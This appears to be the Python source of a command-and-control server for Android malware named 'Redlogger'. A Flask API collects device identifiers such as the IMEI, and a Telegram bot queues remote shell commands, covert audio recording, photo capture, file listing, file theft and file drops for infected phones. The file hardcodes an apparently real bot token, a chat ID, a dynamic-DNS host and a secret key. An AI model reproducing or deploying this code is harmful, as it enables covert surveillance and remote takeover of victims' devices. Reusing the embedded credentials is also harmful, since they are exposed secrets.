import os
import sys
import json
import sqlite3
import logging
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import requests
import asyncio
from threading import Thread

# DON'T CHANGE THIS !!!
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from src.models.user import db
from src.routes.user import user_bp

# Configuration
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '7588831662:AAGsQmG624Dhl6q5opTQS4fGU_SGXE8EcoU')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '7070240983')
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', 'https://marwangpt237.ddns.net')

# Flask app setup
app = Flask(__name__, static_folder=os.path.join(os.path.dirname(__file__), 'static'))
app.config['SECRET_KEY'] = 'asdf#FGSgvasgf$5$WGT'
CORS(app)

app.register_blueprint(user_bp, url_prefix='/api')

# Database setup
app.config['SQLALCHEMY_DATABASE_URI'] = f"sqlite:///{os.path.join(os.path.dirname(__file__), 'database', 'app.db')}"
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db.init_app(app)

# Logging setup
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Database initialization
def init_db():
    conn = sqlite3.connect(os.path.join(os.path.dirname(__file__), 'database', 'redlogger.db'))
    cursor = conn.cursor()
    
    # Create devices table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT UNIQUE NOT NULL,
            imei TEXT,
            android_version TEXT,
            manufacturer TEXT,
            model TEXT,
            first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            status TEXT DEFAULT 'active'
        )
    ''')
    
    # Create logs table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            log_type TEXT NOT NULL,
            content TEXT NOT NULL,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (device_id) REFERENCES devices (device_id)
        )
    ''')
    
    # Create commands table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            command TEXT NOT NULL,
            status TEXT DEFAULT 'pending',
            result TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            executed_at TIMESTAMP,
            FOREIGN KEY (device_id) REFERENCES devices (device_id)
        )
    ''')
    
    conn.commit()
    conn.close()

# Database helper functions
def log_device_data(device_data):
    conn = sqlite3.connect(os.path.join(os.path.dirname(__file__), 'database', 'redlogger.db'))
    cursor = conn.cursor()
    
    # Insert or update device
    cursor.execute('''
        INSERT OR REPLACE INTO devices 
        (device_id, imei, android_version, manufacturer, model, last_seen)
        VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
    ''', (
        device_data.get('device_id', 'unknown'),
        device_data.get('imei', 'N/A'),
        device_data.get('android_version', 'N/A'),
        device_data.get('manufacturer', 'N/A'),
        device_data.get('model', 'N/A')
    ))
    
    # Log the data
    cursor.execute('''
        INSERT INTO logs (device_id, log_type, content)
        VALUES (?, ?, ?)
    ''', (
        device_data.get('device_id', 'unknown'),
        'device_data',
        json.dumps(device_data)
    ))
    
    conn.commit()
    conn.close()

def get_devices():
    conn = sqlite3.connect(os.path.join(os.path.dirname(__file__), 'database', 'redlogger.db'))
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM devices ORDER BY last_seen DESC')
    devices = cursor.fetchall()
    conn.close()
    return devices

def get_device_logs(device_id):
    conn = sqlite3.connect(os.path.join(os.path.dirname(__file__), 'database', 'redlogger.db'))
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM logs WHERE device_id = ? ORDER BY timestamp DESC LIMIT 50', (device_id,))
    logs = cursor.fetchall()
    conn.close()
    return logs

def add_command(device_id, command):
    conn = sqlite3.connect(os.path.join(os.path.dirname(__file__), 'database', 'redlogger.db'))
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO commands (device_id, command)
        VALUES (?, ?)
    ''', (device_id, command))
    conn.commit()
    conn.close()

def get_pending_commands(device_id):
    conn = sqlite3.connect(os.path.join(os.path.dirname(__file__), 'database', 'redlogger.db'))
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM commands WHERE device_id = ? AND status = "pending"', (device_id,))
    commands = cursor.fetchall()
    conn.close()
    return commands

def update_command_result(command_id, result):
    conn = sqlite3.connect(os.path.join(os.path.dirname(__file__), 'database', 'redlogger.db'))
    cursor = conn.cursor()
    cursor.execute('''
        UPDATE commands 
        SET status = 'completed', result = ?, executed_at = CURRENT_TIMESTAMP
        WHERE id = ?
    ''', (result, command_id))
    conn.commit()
    conn.close()

# Telegram Bot Handlers
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    await update.message.reply_text(
        "🔴 Redlogger Controller Bot\n\n"
        "Available commands:\n"
        "/devices - List all connected devices\n"
        "/logs <device_id> - Show logs for a device\n"
        "/cmd <device_id> <command> - Execute command on device\n"
        "/audio <device_id> <duration> - Record audio\n"
        "/photo <device_id> - Take photo\n"
        "/files <device_id> <path> - List files\n"
        "/upload <device_id> <file_path> - Upload file from device\n"
        "/download <device_id> <url> <path> - Download file to device"
    )

async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /devices command"""
    devices = get_devices()
    if not devices:
        await update.message.reply_text("No devices connected.")
        return
    
    message = "📱 Connected Devices:\n\n"
    for device in devices:
        message += f"ID: {device[1]}\n"
        message += f"Model: {device[4]} {device[5]}\n"
        message += f"Android: {device[3]}\n"
        message += f"Last seen: {device[6]}\n"
        message += f"Status: {device[7]}\n\n"
    
    await update.message.reply_text(message)

async def logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /logs command"""
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /logs <device_id>")
        return
    
    device_id = context.args[0]
    logs = get_device_logs(device_id)
    
    if not logs:
        await update.message.reply_text(f"No logs found for device {device_id}")
        return
    
    message = f"📋 Logs for device {device_id}:\n\n"
    for log in logs[:10]:  # Show last 10 logs
        message += f"[{log[4]}] {log[2]}: {log[3][:100]}...\n"
    
    await update.message.reply_text(message)

async def cmd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /cmd command"""
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /cmd <device_id> <command>")
        return
    
    device_id = context.args[0]
    command = ' '.join(context.args[1:])
    
    add_command(device_id, f"shell:{command}")
    await update.message.reply_text(f"Command queued for device {device_id}: {command}")

async def audio_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /audio command"""
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /audio <device_id> [duration]")
        return
    
    device_id = context.args[0]
    duration = context.args[1] if len(context.args) > 1 else "5"
    
    add_command(device_id, f"audio:{duration}")
    await update.message.reply_text(f"Audio recording queued for device {device_id} ({duration}s)")

async def photo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /photo command"""
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /photo <device_id>")
        return
    
    device_id = context.args[0]
    add_command(device_id, "photo")
    await update.message.reply_text(f"Photo capture queued for device {device_id}")

async def files_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /files command"""
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /files <device_id> [path]")
        return
    
    device_id = context.args[0]
    path = context.args[1] if len(context.args) > 1 else "/sdcard"
    
    add_command(device_id, f"files:{path}")
    await update.message.reply_text(f"File listing queued for device {device_id}: {path}")

async def upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /upload command"""
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /upload <device_id> <file_path>")
        return
    
    device_id = context.args[0]
    file_path = context.args[1]
    
    add_command(device_id, f"upload:{file_path}")
    await update.message.reply_text(f"File upload queued for device {device_id}: {file_path}")

async def download_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /download command"""
    if len(context.args) < 3:
        await update.message.reply_text("Usage: /download <device_id> <url> <destination_path>")
        return
    
    device_id = context.args[0]
    url = context.args[1]
    dest_path = context.args[2]
    
    add_command(device_id, f"download:{url}:{dest_path}")
    await update.message.reply_text(f"File download queued for device {device_id}")

# Flask Routes
@app.route('/webhook', methods=['POST'])
def webhook():
    """Handle Telegram webhook"""
    if TELEGRAM_BOT_TOKEN == 'YOUR_TELEGRAM_BOT_TOKEN':
        return jsonify({'error': 'Telegram bot not configured'}), 400
    
    # This would handle Telegram webhook updates
    # For simplicity, we'll use polling instead
    return jsonify({'status': 'ok'})

@app.route('/api/data', methods=['POST'])
def receive_data():
    """Receive data from Android clients"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        
        log_device_data(data)
        logger.info(f"Received data from device {data.get('device_id', 'unknown')}")
        
        return jsonify({'status': 'success'})
    except Exception as e:
        logger.error(f"Error processing data: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/commands/<device_id>', methods=['GET'])
def get_commands(device_id):
    """Get pending commands for a device"""
    try:
        commands = get_pending_commands(device_id)
        command_list = []
        for cmd in commands:
            command_list.append({
                'id': cmd[0],
                'command': cmd[2],
                'created_at': cmd[4]
            })
        
        return jsonify({'commands': command_list})
    except Exception as e:
        logger.error(f"Error getting commands: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/commands/<int:command_id>/result', methods=['POST'])
def submit_result(command_id):
    """Submit command execution result"""
    try:
        data = request.get_json()
        result = data.get('result', '')
        
        update_command_result(command_id, result)
        logger.info(f"Command {command_id} completed")
        
        return jsonify({'status': 'success'})
    except Exception as e:
        logger.error(f"Error submitting result: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/devices', methods=['GET'])
def api_devices():
    """API endpoint to get all devices"""
    try:
        devices = get_devices()
        device_list = []
        for device in devices:
            device_list.append({
                'id': device[0],
                'device_id': device[1],
                'imei': device[2],
                'android_version': device[3],
                'manufacturer': device[4],
                'model': device[5],
                'first_seen': device[6],
                'last_seen': device[7],
                'status': device[8]
            })
        
        return jsonify({'devices': device_list})
    except Exception as e:
        logger.error(f"Error getting devices: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve(path):
    static_folder_path = app.static_folder
    if static_folder_path is None:
        return "Static folder not configured", 404

    if path != "" and os.path.exists(os.path.join(static_folder_path, path)):
        return send_from_directory(static_folder_path, path)
    else:
        index_path = os.path.join(static_folder_path, 'index.html')
        if os.path.exists(index_path):
            return send_from_directory(static_folder_path, 'index.html')
        else:
            return "index.html not found", 404

# Telegram Bot Setup
def run_telegram_bot():
    """Run the Telegram bot in a separate thread"""
    if TELEGRAM_BOT_TOKEN == 'YOUR_TELEGRAM_BOT_TOKEN':
        logger.warning("Telegram bot token not configured, skipping bot startup")
        return
    
    async def main():
        application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
        
        # Add handlers
        application.add_handler(CommandHandler("start", start_command))
        application.add_handler(CommandHandler("devices", devices_command))
        application.add_handler(CommandHandler("logs", logs_command))
        application.add_handler(CommandHandler("cmd", cmd_command))
        application.add_handler(CommandHandler("audio", audio_command))
        application.add_handler(CommandHandler("photo", photo_command))
        application.add_handler(CommandHandler("files", files_command))
        application.add_handler(CommandHandler("upload", upload_command))
        application.add_handler(CommandHandler("download", download_command))
        
        # Start the bot
        await application.initialize()
        await application.start()
        await application.updater.start_polling()
        
        # Keep the bot running
        while True:
            await asyncio.sleep(1)
    
    # Run the bot
    asyncio.run(main())

if __name__ == '__main__':
    # Initialize database
    with app.app_context():
        db.create_all()
        init_db()
    
    # Start Telegram bot in a separate thread
    bot_thread = Thread(target=run_telegram_bot, daemon=True)
    bot_thread.start()
    
    # Start Flask app
    app.run(host='0.0.0.0', port=5000, debug=True)

